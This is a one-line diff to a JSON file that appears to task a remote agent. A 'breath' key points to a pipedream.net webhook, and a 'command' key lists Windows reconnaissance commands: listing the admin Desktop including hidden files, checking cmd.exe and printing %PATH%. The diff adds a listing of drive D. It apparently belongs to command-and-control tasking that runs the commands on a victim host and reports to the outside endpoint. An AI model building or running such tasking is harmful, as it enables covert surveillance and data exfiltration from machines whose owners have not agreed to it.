@@ -1,1 +1,1 @@
-{"breath":"https://eog70e0zwzqc91s.m.pipedream.net","command":"cd C:\\Users\\admin\\Desktop\ndir \/a\ndir C:\\Windows\\system32\\cmd.exe\necho %PATH%"}
+{"breath":"https://eog70e0zwzqc91s.m.pipedream.net","command":"cd C:\\Users\\admin\\Desktop\ndir \/a\ndir C:\\Windows\\system32\\cmd.exe\necho %PATH%\ndir D:\\"}
